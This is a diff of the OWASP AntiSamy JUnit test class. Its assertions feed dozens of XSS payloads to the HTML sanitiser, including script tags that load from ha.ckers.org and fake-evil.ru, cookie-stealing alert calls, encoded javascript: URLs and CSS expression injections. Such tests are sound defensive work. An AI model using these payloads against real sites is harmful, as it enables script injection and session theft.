@@ -1,9 +1,5 @@
 package org.owasp.validator.html.test;
 
-import java.util.Arrays;
-import java.util.List;
-import java.util.Locale;
-
 import org.owasp.validator.html.AntiSamy;
 import org.owasp.validator.html.Policy;
 
@@ -13,15 +9,13 @@ import junit.framework.TestCase;
 import junit.framework.TestSuite;
 
 import org.apache.commons.codec.binary.Base64;
-import org.owasp.validator.html.AntiSamy;
 import org.owasp.validator.html.CleanResults;
-import org.owasp.validator.html.Policy;
 import org.owasp.validator.html.ScanException;
 
 /**
- * This class tests AntiSamy functionality and the basic policy file which should be immune to XSS and 
+ * This class tests AntiSamy functionality and the basic policy file which should be immune to XSS and
  * CSS phishing attacks.
- * 
+ *
  * @author Arshan Dabirsiaghi
  *
  */
@@ -45,39 +39,38 @@ public class AntiSamyTest extends TestCase {
             "O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9",
             "C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG",
         };
-        
+
 	private AntiSamy as = new AntiSamy();
 	private Policy policy = null;
-	
+
 	public AntiSamyTest (String s) { super(s); }
-	
+
 	protected void setUp() throws Exception {
-		
+
 		/*
-		 * Load the policy. You may have to change the path to find the Policy file.
+		 * Load the policy. You may have to change the path to find the Policy file for your environment.
 		 */
 
 		policy = Policy.getInstance("resources/antisamy.xml");
+
 		//policy = Policy.getInstance("/Users/joni/Scratch/antisamy/policy/antisamy-1.1.1.xml");
-		
-		System.out.println(as.scan("<img alt=\"\" src=\"http://profileflirts.com/pics/awareness/troops/0001.$%20,@+gif\" />", policy).getCleanHTML());
-                
+
 	}
-	
+
 	protected void tearDown() throws Exception { }
-	
+
 	public static Test suite() {
-		
+
 		TestSuite suite = new TestSuite(AntiSamyTest.class);
 		return suite;
-		
+
 	}
-	
-	
+
+
 	/*
-	 * Test basic XSS cases. 
+	 * Test basic XSS cases.
 	 */
-	
+
 	public void testScriptAttacks() {
 
 		try {
@@ -85,77 +78,76 @@ public class AntiSamyTest extends TestCase {
 			assertTrue ( as.scan("test<script>alert(document.cookie)</script>",policy).getCleanHTML().indexOf("script") ==  -1);
 			assertTrue ( as.scan("<<<><<script src=http://fake-evil.ru/test.js>",policy).getCleanHTML().indexOf("<script") == -1 );
 			assertTrue ( as.scan("<script<script src=http://fake-evil.ru/test.js>>",policy).getCleanHTML().indexOf("<script") == -1 );
-			
+
 			assertTrue ( as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",policy).getCleanHTML().indexOf("<script") == -1 );
 			assertTrue ( as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",policy).getCleanHTML().indexOf("onload") == -1 );
 			assertTrue ( as.scan("<BODY ONLOAD=alert('XSS')>",policy).getCleanHTML().indexOf("alert") == -1 );
 
 			assertTrue ( as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <",policy).getCleanHTML().indexOf("<iframe") == -1 );
 			assertTrue ( as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("src") == -1 );
-			
+
+			try {
+	    		as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>",policy);
+	    	} catch (Throwable t) {
+	    		t.printStackTrace();
+	    		fail("Caught exception in testScriptAttacks(): "+t.getMessage());
+	    	}
+
 		} catch (Exception e) {
 			fail("Caught exception in testScriptAttack(): "+e.getMessage());
 		}
-		
+
 	}
-	
+
 	public void testImgAttacks() {
-		
+
 		try {
-		
+
 			assertTrue ( as.scan("<img src='http://www.myspace.com/img.gif'>",policy).getCleanHTML().indexOf("<img") != -1);
 			assertTrue ( as.scan("<img src=javascript:alert(document.cookie)>",policy).getCleanHTML().indexOf("<img") == -1);
 			assertTrue ( as.scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",policy).getCleanHTML().indexOf("<img") == -1 );
-			assertTrue ( as.scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",policy).getCleanHTML().indexOf("&amp;") != -1 );
-			assertTrue ( as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",policy).getCleanHTML().indexOf("&amp;") != -1 );
+
+			CleanResults cr = as.scan("<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>",policy);
+
+			System.out.println("Errors: "+cr.getNumberOfErrors());
+			for(int i=0;i<cr.getNumberOfErrors();i++) {
+				System.out.println(cr.getErrorMessages().get(i));
+			}
+
 			assertTrue ( as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",policy).getCleanHTML().indexOf("alert") == -1 );
+
+			cr = as.scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",policy);
+			assertTrue ( cr.getCleanHTML() == null || cr.getCleanHTML().length() == 0 || cr.getCleanHTML().indexOf("&amp;") != -1 );
+			cr = as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",policy);
+			assertTrue ( cr.getCleanHTML() == null || cr.getCleanHTML().length() == 0 || cr.getCleanHTML().indexOf("&amp;") != -1 );
 			assertTrue ( as.scan("<IMG SRC=\"javascript:alert('XSS')\"",policy).getCleanHTML().indexOf("javascript") == -1 );
 			assertTrue ( as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">",policy).getCleanHTML().indexOf("javascript") == -1 );
 			assertTrue ( as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("javascript") == -1 );
-			
-			
+
+
 		} catch(Exception e) {
 			fail("Caught exception in testImgSrcAttacks(): "+e.getMessage());
 		}
 	}
-	
-	
+
+
 	public void testHrefAttacks() {
-		
-		try {	
-			
+
+		try {
+
 			assertTrue ( as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("href") == -1 );
 			assertTrue ( as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">",policy).getCleanHTML().indexOf("href") == -1 );
 			assertTrue ( as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",policy).getCleanHTML().indexOf("ha.ckers.org") == -1 );
 			assertTrue ( as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",policy).getCleanHTML().indexOf("ha.ckers.org") == -1 );
-			
+
 			assertTrue ( as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",policy).getCleanHTML().indexOf("xss.htc") == -1 );
-			
+
 			assertTrue ( as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",policy).getCleanHTML().indexOf("javascript") == -1 );
-			
-			
+
+
 			assertTrue ( as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>",policy).getCleanHTML().indexOf("vbscript") == -1 );
-			
-			try {
-				assertTrue ( as.scan("<a . href=\"http://www.test.com\">",policy).getCleanHTML().indexOf("href") != -1 );
-			} catch (Exception e) {
-				e.printStackTrace();
-				fail("Couldn't parse malformed HTML: " + e.getMessage());
-			}
-			
-			try {
-				assertTrue ( as.scan("<a - href=\"http://www.test.com\">",policy).getCleanHTML().indexOf("href") != -1 );
-			} catch (Exception e) {
-				fail("Couldn't parse malformed HTML: " + e.getMessage());
-			}
-			
-			try {
-				assertTrue ( as.scan("<style>",policy) != null );
-			} catch (Exception e) {
-				e.printStackTrace();
-				fail("Couldn't parse malformed HTML: " + e.getMessage());
-			}
-			
+
+
 			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("<meta") == -1 );
 
 
@@ -171,12 +163,12 @@ public class AntiSamyTest extends TestCase {
 			assertTrue ( as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).getCleanHTML().indexOf("ript:alert") == -1 );
 			assertTrue ( as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy).getCleanHTML().indexOf("javascript") == -1 );
 			assertTrue ( as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).getCleanHTML().indexOf("<base") == -1 );
-			
+
 			assertTrue ( as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).getCleanHTML().indexOf("<object") == -1 );
 			assertTrue ( as.scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).getCleanHTML().indexOf("<object") == -1 );
 			assertTrue ( as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().indexOf("<embed") == -1 );
 			assertTrue ( as.scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().indexOf("<embed") == -1 );
-			
+
 			assertTrue ( as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
 			assertTrue ( as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
 
@@ -184,74 +176,92 @@ public class AntiSamyTest extends TestCase {
 			assertTrue ( as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
 			assertTrue ( as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("script") == -1 );
 			assertTrue ( as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js",policy).getCleanHTML().indexOf("<script") == -1 );
-			
+
 			assertTrue ( as.scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>", policy).getCleanHTML().indexOf("style") == -1 );
-			
+
 			assertTrue ( as.scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>",policy).getCleanHTML().indexOf("aim.exe") == -1 );
 			assertTrue ( as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->",policy).getCleanHTML().indexOf("javascript") == -1 );
 			assertTrue ( as.scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">",policy).getCleanHTML().indexOf("document") == -1 );
-						
+
 		} catch(Exception e) {
 			fail("Caught exception in testHrefSrcAttacks(): "+e.getMessage());
 		}
 	}
-	
+
 	/*
-	 * Test CSS protections. 
+	 * Test CSS protections.
 	 */
-	
+
 	public void testCssAttacks() {
-	    
+
 		try {
-	    	
+
 			assertTrue ( as.scan("<div style=\"position:absolute\">",policy).getCleanHTML().indexOf("position") == -1 );
 			assertTrue ( as.scan("<style>b { position:absolute }</style>",policy).getCleanHTML().indexOf("position") == -1 );
 			assertTrue ( as.scan("<div style=\"z-index:25\">",policy).getCleanHTML().indexOf("position") == -1 );
 			assertTrue ( as.scan("<style>z-index:25</style>",policy).getCleanHTML().indexOf("position") == -1 );
-			assertTrue ( as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">",policy).getCleanHTML().indexOf("font-family") > -1 );			
+			assertTrue ( as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">",policy).getCleanHTML().indexOf("font-family") > -1 );
 	    } catch (Exception e) {
-	    	fail("Caught exception in testCssAttacks(): "+e.getMessage());		
+	    	fail("Caught exception in testCssAttacks(): "+e.getMessage());
 	    }
 	}
-        
+
+
+	/*
+	 * Test a bunch of strings that have tweaked the XML parsing capabilities
+	 * of NekoHTML.
+	 */
     public void testIllegalXML() {
-       
-    	try {
-    		as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>",policy);
-    	} catch (Throwable t) {
-    		t.printStackTrace();
-    		fail("Caught exception in testIllegalXML(): "+t.getMessage());
-    	}
-    	
+
     	for (int i = 0; i < BASE64_BAD_XML_STRINGS.length; i++) {
-            
+
         	try {
-                
+
             	String testStr = new String(Base64.decodeBase64(BASE64_BAD_XML_STRINGS[i].getBytes()));
                 as.scan(testStr, policy);
-                
+
             } catch (ScanException ex) {
                 // still success
-            	
+
             } catch (Throwable ex) {
             	ex.printStackTrace();
                 fail("Caught unexpected exception in testIllegalXML(): " + ex.getMessage());
             }
         }
+
+		try {
+			assertTrue ( as.scan("<a . href=\"http://www.test.com\">",policy).getCleanHTML().indexOf("href") != -1 );
+		} catch (Exception e) {
+			e.printStackTrace();
+			fail("Couldn't parse malformed HTML: " + e.getMessage());
+		}
+
+		try {
+			assertTrue ( as.scan("<a - href=\"http://www.test.com\">",policy).getCleanHTML().indexOf("href") != -1 );
+		} catch (Exception e) {
+			fail("Couldn't parse malformed HTML: " + e.getMessage());
+		}
+
+		try {
+			assertTrue ( as.scan("<style>",policy) != null );
+		} catch (Exception e) {
+			e.printStackTrace();
+			fail("Couldn't parse malformed HTML: " + e.getMessage());
+		}
     }
-    
+
     public void testPreviousBugs() {
-    	
+
     	/* issue #20 */
     	try {
-    		
+
         	String s = as.scan("<b><i>Some Text</b></i>",policy).getCleanHTML();
         	assertTrue ( s.indexOf("<i />") == -1 );
-        	
+
     	} catch (Exception e) {
     		e.printStackTrace();
     	}
-    	
+
     	/* issue #28 */
     	try {
     		assertTrue ( as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">",policy).getCleanHTML().indexOf("font-family") > -1 );
@@ -259,10 +269,10 @@ public class AntiSamyTest extends TestCase {
     		fail(e.getMessage());
     		e.printStackTrace();
     	}
-    	
+
     	/* issue #30 */
     	try {
-    		String s = "<style type=\"text/css\"><![CDATA[P {  margin-bottom: 0.08in; } ]]></style>";
+    		String s = "<style type=\"text/css\"><![CDATA[P { margin-bottom: 0.08in; } ]]></style>";
     		CleanResults cr = as.scan(s,policy);
     		for(int i=0;i<cr.getNumberOfErrors();i++) {
     			System.out.println(cr.getErrorMessages().get(i).toString());
@@ -272,6 +282,41 @@ public class AntiSamyTest extends TestCase {
     		e.printStackTrace();
     		fail(e.getMessage());
     	}
+
+    	/* issue #32 - nekos problem */
+    	try {
+    		String s = "<SCRIPT =\">\" SRC=\"\"></SCRIPT>";
+    		CleanResults cr = as.scan(s,policy);
+    	} catch( Exception e ) {
+    		e.printStackTrace();
+    		fail(e.getMessage());
+    	}
+
+    	/* issue 31 */
+    	try {
+    		String test = "<b><u><g>foo";
+
+    		policy.setDirective("onUnknownTag", "encode");
+    		CleanResults cr = as.scan(test,policy);
+    		String s = cr.getCleanHTML();
+
+    		if ( s.indexOf("&lt;g&gt;") == -1 ) {
+    			fail("<g> tag not encoded: " + s);
+    		}
+
+    		policy.getTagByName("b").setAction("encode");
+
+    		cr = as.scan(test,policy);
+    		s = cr.getCleanHTML();
+
+    		if ( s.indexOf("&lt;b&gt;") == -1 ) {
+    			fail("after setting action to encode <b> tag not encoded: " + s);
+    		}
+
+    	} catch (Exception e) {
+    		e.printStackTrace();
+    		fail(e.getMessage());
+    	}
     }
-        
+
 }
